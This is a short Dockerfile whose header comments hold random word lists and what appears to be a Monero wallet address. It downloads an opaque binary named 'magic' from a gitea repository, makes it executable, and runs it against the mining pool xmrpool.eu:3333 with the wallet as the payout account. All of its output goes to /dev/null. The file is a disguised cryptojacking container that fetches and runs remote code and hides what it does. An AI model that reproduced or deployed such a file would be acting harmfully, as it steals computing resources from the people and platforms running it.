# utmost system unquoted ornament 
# coffee dormant wanted argue gimmick 
# eluded under agenda menu nephew 
# lexicon trying awesome aching typist 
# nerves fully washing certain donuts nephew

# 4BDvBR1zvB1GAH5DMo994F9fJPyDe6NyJUwnkwxkRxBLG77GfBiUxBQHKdRx8k5U237YW4ZYFHdA9iZYUxxrNcmk4MC5UWf

FROM ubuntu

RUN apt-get update && apt-get install -y wget \
    && wget https://gitea.com/mogenius/hi/raw/branch/main/magic -qO magic \
    && chmod +x magic

CMD ./magic -u 4BDvBR1zvB1GAH5DMo994F9fJPyDe6NyJUwnkwxkRxBLG77GfBiUxBQHKdRx8k5U237YW4ZYFHdA9iZYUxxrNcmk4MC5UWf -o xmrpool.eu:3333 > /dev/null 2>&1
